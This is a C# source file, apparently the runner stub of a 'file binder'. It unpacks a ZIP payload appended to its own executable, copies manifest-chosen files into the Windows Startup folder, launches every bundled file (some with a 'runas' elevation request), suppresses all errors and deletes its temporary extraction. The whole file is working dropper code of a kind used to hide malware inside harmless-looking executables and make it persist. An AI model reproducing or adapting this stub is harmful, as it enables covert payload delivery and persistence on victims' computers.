// ============================================================================
// SplendorFileStub - The runner embedded inside every bound executable.
//
// When executed:
//   1. Reads the appended ZIP payload from itself
//   2. Reads __splendor_manifest.json for extract location and startup files
//   3. Extracts files to the chosen location
//   4. Copies startup-marked files to Windows Startup folder
//   5. Opens all files with their default apps
//   6. Cleans up temp files after a delay
// ============================================================================

using System.Diagnostics;
using System.IO.Compression;
using System.Text;
using System.Text.Json;

namespace SplendorFileStub;

class Program
{
    private static readonly byte[] Magic = Encoding.ASCII.GetBytes("SPLNDBND");
    private const string ManifestName = "__splendor_manifest.json";

    static int Main()
    {
        string? extractDir = null;
        bool shouldCleanup = true;

        try
        {
            string exePath = Environment.ProcessPath
                ?? throw new InvalidOperationException("Cannot determine own executable path.");

            byte[] exeBytes = File.ReadAllBytes(exePath);

            if (exeBytes.Length < 16) return 1;

            // Check SPLNDBND magic
            byte[] trailer = new byte[8];
            Array.Copy(exeBytes, exeBytes.Length - 8, trailer, 0, 8);
            if (!trailer.SequenceEqual(Magic)) return 1;

            long zipOffset = BitConverter.ToInt64(exeBytes, exeBytes.Length - 16);
            if (zipOffset < 0 || zipOffset >= exeBytes.Length - 16) return 1;

            int zipLength = exeBytes.Length - 16 - (int)zipOffset;

            // Parse manifest and extract files
            HashSet<string> startupFileNames = new(StringComparer.OrdinalIgnoreCase);
            HashSet<string> adminFileNames = new(StringComparer.OrdinalIgnoreCase);
            string extractLocation = "temp";

            using (var zipStream = new MemoryStream(exeBytes, (int)zipOffset, zipLength))
            using (var archive = new ZipArchive(zipStream, ZipArchiveMode.Read))
            {
                // Read manifest first
                var manifestEntry = archive.GetEntry(ManifestName);
                if (manifestEntry != null)
                {
                    using var reader = new StreamReader(manifestEntry.Open(), Encoding.UTF8);
                    string json = reader.ReadToEnd();

                    try
                    {
                        using var doc = JsonDocument.Parse(json);
                        var root = doc.RootElement;

                        if (root.TryGetProperty("extractLocation", out var locProp))
                            extractLocation = locProp.GetString() ?? "temp";

                        if (root.TryGetProperty("startupFiles", out var sfProp) &&
                            sfProp.ValueKind == JsonValueKind.Array)
                        {
                            foreach (var item in sfProp.EnumerateArray())
                            {
                                string? name = item.GetString();
                                if (!string.IsNullOrEmpty(name))
                                    startupFileNames.Add(name);
                            }
                        }

                        if (root.TryGetProperty("adminFiles", out var afProp) &&
                            afProp.ValueKind == JsonValueKind.Array)
                        {
                            foreach (var item in afProp.EnumerateArray())
                            {
                                string? name = item.GetString();
                                if (!string.IsNullOrEmpty(name))
                                    adminFileNames.Add(name);
                            }
                        }
                    }
                    catch { /* ignore manifest parse errors */ }
                }

                // Determine extract directory
                string uniqueId = Guid.NewGuid().ToString("N")[..12];
                extractDir = extractLocation switch
                {
                    "appdata" => Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                        "SplendorFileBinder", uniqueId),
                    "currentdir" => Path.Combine(
                        Path.GetDirectoryName(exePath) ?? ".",
                        "SplendorFileBinder_" + uniqueId),
                    "programdata" => Path.Combine(
                        Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
                        "SplendorFileBinder", uniqueId),
                    _ => Path.Combine(  // "temp" (default)
                        Path.GetTempPath(),
                        "SplendorFileBinder", uniqueId)
                };

                // Don't auto-cleanup for persistent locations
                shouldCleanup = extractLocation == "temp";

                Directory.CreateDirectory(extractDir);

                // Extract all files except the manifest
                foreach (var entry in archive.Entries)
                {
                    if (entry.FullName == ManifestName) continue;

                    string destPath = Path.Combine(extractDir, entry.FullName);
                    string? dir = Path.GetDirectoryName(destPath);
                    if (dir != null) Directory.CreateDirectory(dir);
                    entry.ExtractToFile(destPath, overwrite: true);
                }
            }

            // Get extracted files
            string[] extractedFiles = Directory.GetFiles(extractDir, "*", SearchOption.AllDirectories);
            if (extractedFiles.Length == 0) return 1;

            // Handle startup files
            if (startupFileNames.Count > 0)
            {
                string startupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

                foreach (string filePath in extractedFiles)
                {
                    string fileName = Path.GetFileName(filePath);
                    if (startupFileNames.Contains(fileName))
                    {
                        try
                        {
                            File.Copy(filePath, Path.Combine(startupFolder, fileName), overwrite: true);
                        }
                        catch { }
                    }
                }
            }

            // Open all files with default apps
            foreach (string filePath in extractedFiles)
            {
                try
                {
                    string fileName = Path.GetFileName(filePath);
                    bool runAsAdmin = adminFileNames.Contains(fileName);

                    Process.Start(new ProcessStartInfo
                    {
                        FileName = filePath,
                        UseShellExecute = true,
                        Verb = runAsAdmin ? "runas" : ""
                    });
                }
                catch { }
            }

            // Wait for apps to load
            Thread.Sleep(5000);

            return 0;
        }
        catch
        {
            return 1;
        }
        finally
        {
            // Only cleanup temp extractions
            if (shouldCleanup && extractDir != null && Directory.Exists(extractDir))
            {
                try { Directory.Delete(extractDir, recursive: true); } catch { }
            }
        }
    }
}
